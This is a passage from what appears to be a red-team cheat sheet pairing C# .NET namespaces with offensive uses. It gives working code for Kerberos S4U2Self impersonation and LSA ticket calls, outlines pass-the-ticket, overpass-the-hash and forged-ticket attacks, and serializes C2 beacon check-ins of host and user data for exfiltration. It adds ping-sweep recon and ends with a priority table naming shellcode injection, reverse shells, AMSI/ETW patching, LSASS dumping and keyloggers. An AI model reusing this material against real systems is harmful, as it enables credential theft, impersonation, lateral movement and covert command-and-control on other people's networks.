// Requires: SeTcbPrivilege or domain service account with delegation
using (var ctx = new System.DirectoryServices.AccountManagement.PrincipalContext(
           System.DirectoryServices.AccountManagement.ContextType.Domain))
{
    // S4U2Self via WindowsIdentity constructor (requires special privileges)
    WindowsIdentity targetId = new WindowsIdentity("targetuser@corp.local");
    // Impersonate → now running as targetuser via Kerberos S4U2Self
    using WindowsImpersonationContext impCtx = targetId.Impersonate();
    Console.WriteLine(WindowsIdentity.GetCurrent().Name);   // → targetuser
}

// ── 3. LSA / SSPI — request Kerberos TGT / service tickets ───────────────
[DllImport("secur32.dll", CharSet = CharSet.Auto)]
static extern int LsaConnectUntrusted(out IntPtr lsaHandle);

[DllImport("secur32.dll", CharSet = CharSet.Auto)]
static extern int LsaCallAuthenticationPackage(
    IntPtr lsaHandle, uint authPkg, IntPtr protocolSubmitBuffer,
    uint submitBufferLength, out IntPtr protocolReturnBuffer,
    out uint returnBufferLength, out int protocolStatus);

[DllImport("secur32.dll", CharSet = CharSet.Auto)]
static extern int LsaLookupAuthenticationPackage(
    IntPtr lsaHandle, ref LSA_STRING packageName, out uint authPkg);

// ── 4. PASS-THE-TICKET (PTT) — inject Kerberos ticket into session ─────────
// Supply a .kirbi ticket file (from Mimikatz / Rubeus) and inject it
// into the current logon session so you authenticate as that user.
// Real implementation via LsaCallAuthenticationPackage with
// KERB_SUBMIT_TKT_REQUEST structure (complex — see Rubeus source).

// ── 5. OVERPASS-THE-HASH ──────────────────────────────────────────────────
// Use NTLM hash to request a Kerberos TGT (hybrid technique).
// spawn a process with runas /netonly using the hash, inject TGT.
// Requires: sekurlsa::pth equivalent via LSA calls.

// ── COMMON KERBEROS ATTACK CONCEPTS ───────────────────────────────────────
// Kerberoasting  : Request TGS for SPN accounts → offline crack NTLM hash
// ASREPRoasting  : Accounts with "Do not require Kerberos pre-auth" → get AS-REP → crack
// Golden Ticket  : Forge TGT using KRBTGT hash (domain persistence)
// Silver Ticket  : Forge TGS for specific service using service account hash
// Diamond Ticket : Modify legit TGT → harder to detect than Golden Ticket
// Pass-the-Ticket: Inject stolen .kirbi ticket into current session

[StructLayout(LayoutKind.Sequential)]
struct LSA_STRING
{
    public ushort Length, MaximumLength;
    public string Buffer;
}
```

**Red Team use-cases:**
- Detect whether authentication is Kerberos or NTLM (targeting info)
- S4U2Self → impersonate any domain user without their password (requires delegation rights)
- PTT → reuse stolen Kerberos tickets for lateral movement
- Kerberoasting via `DirectoryServices` (SPN query → request TGS → crack offline)

---

## `using System.Text.Json` — C2 Protocol Parsing

```csharp
using System.Text.Json;
using System.Text.Json.Serialization;

// PARSE C2 command response
string json = """{"task":"shell","args":["whoami"],"sleep":30}""";
using JsonDocument doc = JsonDocument.Parse(json);
string task  = doc.RootElement.GetProperty("task").GetString();
string arg0  = doc.RootElement.GetProperty("args")[0].GetString();
int    sleep = doc.RootElement.GetProperty("sleep").GetInt32();

// SERIALIZE beacon check-in
var checkin = new
{
    id       = Guid.NewGuid().ToString(),
    hostname = Environment.MachineName,
    user     = Environment.UserName,
    domain   = Environment.UserDomainName,
    os       = Environment.OSVersion.ToString(),
    pid      = System.Diagnostics.Process.GetCurrentProcess().Id,
    arch     = Environment.Is64BitProcess ? "x64" : "x86",
    ts       = DateTimeOffset.UtcNow.ToUnixTimeSeconds()
};
string payload = JsonSerializer.Serialize(checkin);

// DESERIALIZE into typed object
record C2Task(string Task, string[] Args, int Sleep);
C2Task cmd = JsonSerializer.Deserialize<C2Task>(json);

// CUSTOM SERIALIZER OPTIONS (handle case-insensitive C2 servers)
var opts = new JsonSerializerOptions
{
    PropertyNameCaseInsensitive = true,
    WriteIndented               = false    // compact for exfil
};
```

**Red Team use-cases:**
- Parse C2 server task responses (common format: JSON over HTTP)
- Serialize beacon metadata (hostname, user, OS, PID) for check-in
- Build lightweight HTTP C2 protocol in pure C# without dependencies

---

## `using System.Net.NetworkInformation` — Network Recon

```csharp
using System.Net.NetworkInformation;
using System.Net;

// LIST all network interfaces
foreach (NetworkInterface nic in NetworkInterface.GetAllNetworkInterfaces())
{
    Console.WriteLine($"Name    : {nic.Name}");
    Console.WriteLine($"Type    : {nic.NetworkInterfaceType}");
    Console.WriteLine($"Status  : {nic.OperationalStatus}");
    Console.WriteLine($"MAC     : {nic.GetPhysicalAddress()}");

    foreach (UnicastIPAddressInformation ip in
             nic.GetIPProperties().UnicastAddresses)
    {
        Console.WriteLine($"IP      : {ip.Address}");
        Console.WriteLine($"Mask    : {ip.IPv4Mask}");
    }

    // Default gateway
    foreach (GatewayIPAddressInformation gw in
             nic.GetIPProperties().GatewayAddresses)
        Console.WriteLine($"Gateway : {gw.Address}");

    // DNS servers
    foreach (IPAddress dns in nic.GetIPProperties().DnsAddresses)
        Console.WriteLine($"DNS     : {dns}");
}

// PING host (alive check)
Ping ping = new Ping();
PingReply reply = ping.Send("192.168.1.1", 1000);
Console.WriteLine($"{reply.Address} — {reply.Status} — {reply.RoundtripTime}ms");

// PING SWEEP (fast host discovery)
async Task PingSweep(string subnet)   // e.g. "192.168.1"
{
    var tasks = Enumerable.Range(1, 254).Select(async i =>
    {
        string host = $"{subnet}.{i}";
        var p = new Ping();
        var r = await p.SendPingAsync(host, 500);
        if (r.Status == IPStatus.Success)
            Console.WriteLine($"ALIVE: {host}");
    });
    await Task.WhenAll(tasks);
}

// ARP TABLE — find hosts on local network (no packets sent)
// Read from: netsh interface ip show neighbors (or parse arp cache via P/Invoke)
var arpProcess = new System.Diagnostics.Process
{
    StartInfo = new System.Diagnostics.ProcessStartInfo
    {
        FileName = "arp", Arguments = "-a",
        RedirectStandardOutput = true, UseShellExecute = false
    }
};
arpProcess.Start();
Console.WriteLine(arpProcess.StandardOutput.ReadToEnd());

// CHECK internet connectivity
bool IsOnline() => NetworkInterface.GetIsNetworkAvailable();
```

**Red Team use-cases:**
- Enumerate IP addresses, subnets, gateways (network topology mapping)
- Fast ping sweep for host discovery (no Nmap needed)
- MAC address collection (identify vendor, detect VMs)
- DNS server identification (targeting for DNS attacks)

---

## Quick Reference — Complete Red Team Priority Map

| Priority | Namespace | Primary Use |
|:---:|---|---|
| ⭐⭐⭐ | `System.Runtime.InteropServices` | Shellcode injection, P/Invoke, syscalls |
| ⭐⭐⭐ | `System.Net.Sockets` | Reverse shell, C2 channel |
| ⭐⭐⭐ | `System.Reflection` | In-memory execution, AV bypass |
| ⭐⭐⭐ | `System.Diagnostics` | Process execution, enumeration |
| ⭐⭐⭐ | `System.Security.Cryptography` | Payload encryption, C2 traffic |
| ⭐⭐⭐ | `System.Security.Principal` | Token stealing, privilege escalation |
| ⭐⭐⭐ | EDR/AV Evasion (P/Invoke) | AMSI/ETW patch, unhooking, direct syscalls |
| ⭐⭐⭐ | Advanced Injection | Hollowing, APC, DLL inject, thread hijack |
| ⭐⭐ | `System.Net` | HTTP beacon, payload download |
| ⭐⭐ | `System.Management` | WMI recon, lateral movement |
| ⭐⭐ | `System.DirectoryServices` | AD enumeration, Kerberoasting |
| ⭐⭐ | `System.IO` + `Compression` | File ops, exfil compression |
| ⭐⭐ | `Microsoft.Win32` | Registry persistence |
| ⭐⭐ | `System.Threading` | Async beacons, sandbox evasion |
| ⭐⭐ | `System.IO.Pipes` | SMB C2, named pipe comms |
| ⭐⭐ | `System.Security` (DPAPI) | Chrome/browser cred decryption |
| ⭐⭐ | LSASS / SAM Dumping | Credential access, hash extraction |
| ⭐⭐ | COM Interop / DCOM | LOLbin exec, lateral movement |
| ⭐⭐ | `System.IdentityModel` | Kerberos attacks, S4U, PTT |
| ⭐⭐ | `System.Net.NetworkInformation` | Network recon, ping sweep |
| ⭐ | `System.Text.Json` | C2 protocol, beacon serialization |
| ⭐ | `System.Windows.Forms` | Keylogger, screenshot, clipboard |
| ⭐ | `System.Drawing` | Screenshot capture, steganography |
| ⭐ | `System` (Environment) | Recon, env var harvesting |
